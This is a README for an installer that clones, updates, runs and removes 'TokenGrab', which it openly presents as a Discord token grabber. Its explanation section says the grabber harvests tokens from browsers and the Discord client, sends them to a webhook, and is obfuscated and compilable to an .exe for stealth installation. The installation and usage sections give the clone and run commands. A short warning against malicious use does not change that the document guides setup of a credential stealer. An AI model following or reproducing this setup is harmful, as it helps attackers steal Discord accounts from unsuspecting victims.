# Slender Setup

This README provides detailed instructions on how to install, use, and manage the **Slender Setup** for the **TokenGrab** project, including the token grabber functionality, updates, and environment management.

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Token Grabber Explanation](#token-grabber-explanation)
5. [Menu Options](#menu-options)
6. [Troubleshooting](#troubleshooting)
7. [Contribution](#contribution)
8. [License](#license)

## Prerequisites

Before starting, ensure that you have the following installed on your system:

- Python 3.7 or higher
- `pip` (Python package manager)
- Git (for downloading the project)

You can download Python from the [official website](https://www.python.org/) and Git from [here](https://git-scm.com/).

## Installation

To install and configure **Slender Setup**, follow these steps:

1. Clone this repository or download the `Installer.py` script:
    ```bash
    git clone https://github.com/ErrorNoName/TKGPublic.git
    ```
    Alternatively, download the `Installer.py` file from the repository.

2. Open a terminal and navigate to the directory where `Installer.py` is located.

3. Run the installation script with the following command:
    ```bash
    python Installer.py
    ```

4. The script will automatically install any missing dependencies, set up the environment, and display a menu with the available options.

## Usage

To use the setup program, simply run `Installer.py` and choose from the options available in the interactive menu.

```bash
python Installer.py
```

This will prompt the following actions:
- Install the required components.
- Detect and update the token grabber.
- Activate the virtual environment.
- Run the main script (`Main.py`).
- Delete the token grabber.

## Token Grabber Explanation

The **Token Grabber** is a Python-based script designed to collect **Discord tokens** from local browsers or the Discord client itself, enabling automation or other actions. Here is a breakdown of how it works:

1. **File Detection**: The grabber scans various directories (such as local storage, Discord Canary, browsers) to find Discord tokens.
2. **Webhook Transmission**: Once a token is found, it sends the collected information to a Discord webhook for processing.
3. **Stealth Features**: The grabber is obfuscated and can be compiled to a `.exe` for stealth installation.
4. **Virtual Environment Management**: The script automatically creates a Python virtual environment to isolate dependencies and ensure that the right versions of libraries are used.
5. **Auto-Update Detection**: The script checks the repository for any updates and applies them when available.

### Example of Token Grabber Behavior

- **Installation**: The script downloads the project repository, extracts the necessary files, and checks for updates before proceeding.
- **Execution**: Once installed, it runs `Main.py` to initiate the token collection process, managing all necessary dependencies through the virtual environment.

**Warning**: Using or distributing token grabbers for malicious purposes (such as unauthorized access to Discord accounts) is illegal and a violation of Discord's terms of service.

## Menu Options

The main menu offers the following options for managing the installation:

1. **Install and Setup TokenGrab**:
   - Clones the project repository from GitHub.
   - Sets up a virtual environment.
   - Installs all required dependencies from `requirements.txt`.
   - Runs the `Main.py` script.

2. **Check for Updates**:
   - Checks if any new updates are available for the repository.
   - Pulls the latest changes and updates the local version if needed.

3. **Run Main Script**:
   - Executes the `Main.py` script located in the repository.

4. **Delete TokenGrab**:
   - Runs the `AdvancedTokenGrabDelete.py` script to remove all traces of the token grabber from the system.

5. **Exit**:
   - Exits the setup program.

### Example Output:
```
*** TKGPublic Setup Menu ***
1. Install and Setup TokenGrab
2. Check for Updates
3. Run Main Script
4. Delete TokenGrab
5. Exit
Enter your choice (1-5):
```

## Troubleshooting

### Common Issues:
1. **Python PATH Issues**:
   - Ensure that Python is correctly installed and added to the system's PATH.

2. **Dependency Errors**:
   - If dependencies fail to install, try manually installing them:
     ```bash
     pip install GitPython tqdm colorama
     ```

3. **Permission Denied**:
   - If you encounter permission errors, try running the terminal or command prompt as an administrator.

4. **Module Not Found**:
   - If you see a "ModuleNotFoundError", run the following command to install the missing modules:
     ```bash
     pip install -r requirements.txt
     ```

5. **Virtual Environment Activation**:
   - If the virtual environment does not activate automatically, you may need to manually activate it using:
     ```bash
     source venv/bin/activate   # For MacOS/Linux
     venv\Scripts\activate.bat  # For Windows
     ```
